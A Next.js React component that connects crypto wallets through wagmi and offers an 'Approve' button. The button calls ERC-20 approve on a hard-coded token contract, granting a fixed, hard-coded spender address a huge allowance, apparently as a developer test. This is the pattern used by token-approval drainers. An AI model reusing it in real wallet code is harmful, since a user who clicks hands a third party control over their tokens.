"use client";
import { Button } from "antd";
import Image from "next/image";
import {
  useConnect,
  useAccount,
  useDisconnect,
  useEnsAvatar,
  useEnsName,
} from "wagmi";
import { useEffect, useState } from "react";
import '../index.css'
import { ethers } from "ethers";

export default function Home() {
  const { connectors } = useConnect();
  const { isConnected } = useAccount();

  if (isConnected) return <Account />;

  const walletConnectConnector = connectors.find(
    (connector) => connector.id === "walletConnect"
  );

  const injectedConnector = connectors.find(
    (connector) => connector.id === "injected"
  );

  const eip6963Connectors = connectors.filter(
    (connector) =>
      connector !== walletConnectConnector && connector !== injectedConnector
  );

  const eip6963Buttons = eip6963Connectors.map((connector) => (
    <ConnectorButton key={connector.id} connector={connector} />
  ));

  return (
    <div className="flex flex-col items-center">
      <div className="inline-flex w-60 p-2 my-2 border-1 border-black border-dashed flex-col items-center gap-y-1">
        <p>The following are the mobile scan code access capabilities provided by <strong>WalletConnect</strong></p>
        <ConnectorButton connector={walletConnectConnector} />
      </div>
      <div className="inline-flex w-60 p-2 my-2 border-1 border-black border-dashed flex-col items-center gap-y-1">
        <p>The following are the injection link capabilities provided by EIP-1193</p>
        <ConnectorButton connector={injectedConnector} />
      </div>
      <div className="inline-flex w-60 p-2 my-2 border-1 border-black border-dashed flex-col items-center gap-y-1">
        <p>Here are the Chrome extensions supported by your browser, found from EIP-6963</p>
        {eip6963Buttons}
      </div>
    </div>
  );
}

declare let window: any
const Account = () => {
  const { address } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: ensName } = useEnsName({ address });
  const { data: ensAvatar } = useEnsAvatar({ name: ensName! });

  // 创建一个 Web3Provider 实例
  const provider = new ethers.BrowserProvider(window.ethereum)

  // 定义 ERC20 合约的 ABI
  const erc20ABI = [
    {
      constant: false,
      inputs: [
        { name: '_spender', type: 'address' },
        { name: '_value', type: 'uint256' }
      ],
      name: 'approve',
      outputs: [{ name: 'success', type: 'bool' }],
      payable: false,
      stateMutability: 'nonpayable',
      type: 'function'
    }
  ]

  // 创建 ERC20 合约实例
  const contractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // 替换为实际的合约地址

  // 定义 approveToken 函数
  async function approveToken(spenderAddress: string, amount: string) {
    try {
      // 创建一个签名者
      const signer = await provider.getSigner()
      // 获取用户的以太坊地址
      const account = await signer.getAddress()
      console.log('Connected with address:', account)

      // 将金额转换为 wei 单位
      const value = ethers.parseEther(amount.toString());

      // 调用 approve 方法
      const tokenContract = new ethers.Contract(contractAddress, erc20ABI, signer);
      const tx = await tokenContract.approve(spenderAddress, value);

      // 等待交易确认
      const receipt = await tx.wait();

      console.log('Transaction receipt:', receipt);
    } catch (error) {
      console.error('Error approving tokens:', error);
    }
  }

  //Approve 授权
  function approveTest() {
    approveToken('0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', '100000000000000000000000000')
  }

  return (
    <div className="flex min-h-screen flex-col items-center justify-start marginTop20">
      {ensAvatar && <Image alt="ENS Avatar" src={ensAvatar} />}
      {address && <div>{ensName ? `${ensName} (${address})` : address}</div>}
      <Button className="marginTop20" onClick={() => disconnect()}>Disconnect</Button>
      <Button className="marginTop20" onClick={() => { approveTest() }}>Approve</Button>
    </div>
  );
};

const ConnectorButton = ({ connector }: { connector: any }) => {
  const [providerReady, setProviderReady] = useState(false);
  const { connect } = useConnect();

  useEffect(() => {
    if (!connector) return;
    (async () => {
      try {
        const provider = await connector.getProvider();
        setProviderReady(!!provider);
      } catch (error) {
        console.error(error);
      }
    })();
  }, [connector]);

  const onClick = () => {
    connect({ connector: connector });
  };

  return (
    <Button
      block
      icon={
        connector.icon && <Image
          src={connector.icon}
          width={14}
          height={14}
          alt={connector.name}
        />
      }
      type="default"
      loading={!providerReady}
      onClick={onClick}
    >
      {connector.name}
    </Button>
  );
};


